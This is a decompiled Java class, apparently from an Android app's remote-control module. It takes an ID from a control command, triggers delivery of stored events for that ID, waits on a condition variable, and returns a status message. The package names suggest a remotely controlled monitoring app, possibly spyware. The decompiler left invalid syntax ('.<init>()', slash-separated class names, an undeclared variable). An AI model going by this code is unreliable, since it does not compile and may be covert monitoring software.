package com.vvt.appengine.a;

import android.os.ConditionVariable;

import com.vvt.appengine.AppEngine1;
import com.vvt.eventdelivery.f;
import com.vvt.exceptions.database.FxDbIdNotFoundException;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

public class cd
{
  private static final boolean b = com.vvt.ak.a.a;
  com.vvt.datadeliverymanager.a.a a;
  private RmtCtrlOutputStatusMessage c;
  private ConditionVariable d;
  private AppEngine1 e;
  private int f = -1;
  
  public cd()
  {
    ce localce = new com/vvt/appengine/a/ce;
    localce.<init>(this);
    this.a = localce;
  }
  
  public RmtCtrlOutputStatusMessage a(ControlCommand paramControlCommand, AppEngine1 paramh)
  {
    this.e = paramh;
    Object localObject1 = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
    ((RmtCtrlOutputStatusMessage)localObject1).<init>();
    this.c = ((RmtCtrlOutputStatusMessage)localObject1);
    localObject1 = paramControlCommand.getData();
    localObject2 = new android/os/ConditionVariable;
    ((ConditionVariable)localObject2).<init>(false);
    this.d = ((ConditionVariable)localObject2);
    boolean bool1 = localObject1 instanceof Integer;
    if (bool1)
    {
      bool1 = b;
      if (bool1) {}
      localObject1 = (Integer)localObject1;
      int j = ((Integer)localObject1).intValue();
      this.f = j;
    }
    try
    {
      boolean bool2 = b;
      if (bool2) {}
      localObject1 = paramh.i;
      int i = this.f;
      com.vvt.datadeliverymanager.a.a locala = this.a;
      ((f)localObject1).a(i, locala);
      bool2 = b;
      if (bool2) {}
      localObject1 = this.d;
      ((ConditionVariable)localObject1).block();
    }
    catch (FxDbIdNotFoundException localFxDbIdNotFoundException)
    {
      for (;;)
      {
        localObject2 = this.d;
        if (localObject2 != null)
        {
          localObject2 = this.d;
          ((ConditionVariable)localObject2).close();
        }
        this.c.setSuccess(false);
        localObject2 = this.c;
        String str = localFxDbIdNotFoundException.getMessage();
        ((RmtCtrlOutputStatusMessage)localObject2).setMessage(str);
      }
    }
    return this.c;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/cd.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */